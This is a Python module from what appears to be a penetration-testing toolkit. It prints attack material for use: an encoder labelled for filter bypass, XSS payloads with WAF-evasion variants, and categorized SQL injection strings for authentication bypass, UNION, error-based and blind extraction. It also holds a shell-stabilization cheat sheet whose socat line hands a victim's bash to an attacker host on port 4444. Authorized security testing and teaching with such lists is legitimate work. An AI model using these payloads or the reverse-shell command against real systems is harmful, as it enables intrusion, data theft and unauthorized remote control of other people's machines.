from __future__ import annotations

import base64
import urllib.parse

from rich.prompt import Prompt
from rich.table import Table

from .utils import console, header, pause


def multi_encode() -> None:
    header("Payload multi-encoder", "One payload, every encoding (for filter bypass)")
    s = Prompt.ask("Payload")
    b = s.encode()
    rows = [
        ("URL", urllib.parse.quote(s, safe="")),
        ("Double-URL", urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")),
        ("Base64", base64.b64encode(b).decode()),
        ("Hex", b.hex()),
        ("\\x hex", "".join(f"\\x{c:02x}" for c in b)),
        ("Unicode \\u", "".join(f"\\u{c:04x}" for c in b)),
        ("HTML dec", "".join(f"&#{c};" for c in b)),
        ("HTML hex", "".join(f"&#x{c:x};" for c in b)),
        ("Mixed case", "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))),
        ("UTF-16 b64", base64.b64encode(s.encode("utf-16-le")).decode()),
    ]
    t = Table()
    t.add_column("Encoding", style="bold cyan")
    t.add_column("Result", style="green", overflow="fold")
    for name, val in rows:
        t.add_row(name, val)
    console.print(t)
    pause()


XSS_BASE = "<script>alert(1)</script>"
XSS_VARIANTS = [
    "<script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "<details open ontoggle=alert(1)>",
    "<a href=javascript:alert(1)>x</a>",
    "<input autofocus onfocus=alert(1)>",
    "javascript:alert(1)",
    "<script>al\\u0065rt(1)</script>",
    "<img src=x oNeRrOr=alert(1)>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<marquee onstart=alert(1)>",
]


def xss_payloads() -> None:
    header("XSS payload generator", "Reflected/stored XSS + WAF-bypass variants")
    console.print("[dim]Swap alert(1) for your PoC. Test only where authorized.[/]\n")
    for p in XSS_VARIANTS:
        console.print(f"  [green]{p}[/]")
    console.print("\n[dim]Blind XSS? point the callback at the HTTP Interceptor "
                  "catch-all listener (menu h → 1).[/]")
    pause()


SQLI = {
    "Auth bypass": [
        "' OR '1'='1",
        "' OR '1'='1' -- -",
        "admin' -- -",
        "admin' #",
        "' OR 1=1 LIMIT 1 -- -",
        "') OR ('1'='1",
        "\" OR \"\"=\"",
    ],
    "Union-based": [
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "' UNION SELECT user(),database()-- -",
        "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
    ],
    "Error-based": [
        "' AND extractvalue(1,concat(0x7e,version()))-- -",
        "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(version(),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ],
    "Boolean/Time blind": [
        "' AND 1=1-- -",
        "' AND 1=2-- -",
        "' AND SLEEP(5)-- -",
        "'; WAITFOR DELAY '0:0:5'-- -",
        "' AND (SELECT 1 FROM pg_sleep(5))-- -",
    ],
}


def sqli_payloads() -> None:
    header("SQLi payload generator", "Categorized injection strings")
    for cat, payloads in SQLI.items():
        console.print(f"\n[bold magenta]{cat}[/]")
        for p in payloads:
            console.print(f"  [green]{p}[/]")
    console.print("\n[dim]For real automation drive sqlmap (Tool Catalog → search sqlmap).[/]")
    pause()


def shell_stabilize() -> None:
    header("Shell stabilization", "Upgrade a dumb reverse shell to a full interactive TTY")
    steps = [
        ("1. Spawn a PTY (pick one that exists on the box)",
         "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
         "python -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
         "script -qc /bin/bash /dev/null"),
        ("2. Background the shell", "Ctrl-Z"),
        ("3. On YOUR machine, set raw mode + fg", "stty raw -echo; fg"),
        ("4. Back in the shell, fix the environment",
         "export TERM=xterm-256color\n"
         "export SHELL=/bin/bash\n"
         "stty rows 50 cols 200   # match your terminal (check with: stty size)"),
        ("Alt: socat full TTY (both ends)",
         "# listener:  socat file:`tty`,raw,echo=0 TCP-L:4444\n"
         "# victim:    socat TCP:YOU:4444 EXEC:'bash',pty,stderr,setsid,sigint,sane"),
    ]
    for title, cmd in steps:
        console.print(f"\n[bold cyan]{title}[/]")
        console.print(f"[green]{cmd}[/]")
    pause()


MENU = {
    "1": ("Payload multi-encoder", multi_encode),
    "2": ("XSS payload generator", xss_payloads),
    "3": ("SQLi payload generator", sqli_payloads),
    "4": ("Shell stabilization cheat sheet", shell_stabilize),
}
